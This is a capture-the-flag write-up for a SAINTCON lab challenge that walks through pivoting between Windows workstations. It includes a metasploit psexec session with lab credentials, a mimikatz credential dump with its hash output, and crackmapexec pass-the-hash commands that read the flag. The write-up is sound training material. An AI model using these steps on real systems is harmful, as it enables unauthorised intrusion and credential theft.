# WS02 - User

## Challenge Description

This Category of Challenge is presented by The Keep Community at SAINTCON.

Have you ever wanted to come to a conference, hack a machine, and walk away feeling like you own the world? Yeah, you can do that here.

If you get stuck or have any questions, don't hesitate to visit The Keep Community for help or guidance!

========================================

Please Visit the HACKERS CHALLENGE BOOTH to spinup an environment for you!

This environment will be good for 3 hours.

(due to monetary costs, we won't keep it running longer, but can spin you up a new environement when you need it)

========================================

Welcome to the Keep!

You have been tasked with running a pentest on this client's network.

They have placed a file flag.txt on the desktop of all the important users in the network. This will allow them to see how far you have gone.

## Solution

After we got onto **WS01**, we needed to find a way to pivot to **WS02**. We
already `nmap` scanned the machine and didn't see anything interesting. The
credentials found previously also don't work.

Back to **WS01** to see what we can do. To make life easier since I have no idea
what I'm doing on Windows, I started to use metasploit. 

```bash
$ msfconsole

> use exploit/windows/smb/psexec
> set LHOST [YOUR LISTENING IP]
> set LPORT [YOUR LISTENING PORT]
> set RHOSTS [WS01 IP]
> set SMBPass goCougs123
> set SMBDomain HC
> set SMBUser darkon

> exploit
```

Cool! I'm connected. I have a terminal which I like. Let's now figure out what
is going on with this machine.

Running a `ps` you'll notice that there is another user signed in: `bashninja`. 

Oh... Let's see if `mimikatz` will work. Back in my normal terminal:

```bash
wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip
```

Now in meterpreter you can upload a file:

```
> upload [FILE PATH TO THE ZIP FILE]
```

Now in your RDP session you can unzip the folder. The reason I don't download it
within RDP is because we only had Internet Explorer... which was aweful to use
because it has the restricted mode turned on.

Back in meterpreter, I did the following:

```cmd
> shell

$ cd [TO YOUR DIRECTORY WHERE MIMIKATZ IS]
$ mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" >> c:\tmp\mimikatz_output.txt
...
...
Authentication Id : 0 ; 237953 (00000000:0003a181)
Session           : RemoteInteractive from 2
User Name         : bashninja
Domain            : HC
Logon Server      : DC
Logon Time        : 10/26/2023 5:04:53 PM
SID               : S-1-5-21-636138077-4214483599-707087073-1115
	msv :
	[00000003] Primary
	* Username : bashninja
	* Domain   : HC
	* NTLM     : e68968cfbc5ab5ac534c1cd3715946dc
	* SHA1     : 36bc9b15a4415770785aa843e9f153379a09caf6
	* DPAPI    : 6058cb499b0f67bf51bd9418880f61bd
	tspkg :
	wdigest :
	* Username : bashninja
	* Domain   : HC
	* Password : (null)
	kerberos :
	* Username : bashninja
	* Domain   : HC.LOCAL
	* Password : (null)
	ssp :
	credman :
...
...
```

Oh cool! We have a NTLM hash. Now we can perform a _pass-the-hash_ attack.  You
can try `xfreerdp` and find that the user is not allowed to RDP into the
machine...

But let's try another way:

```bash
crackmapexec smb WS02/32 -u bashninja -d HC -H e68968cfbc5ab5ac534c1cd3715946dc -x dir
```

And we are returned with results! Awesome! We know where the flag will be so:

```bash
crackmapexec smb WS02/32 -u bashninja -d HC -H e68968cfbc5ab5ac534c1cd3715946dc -x type C:\\Users\\bashninja\\Desktop\\flag.txt
```

And we get a flag!

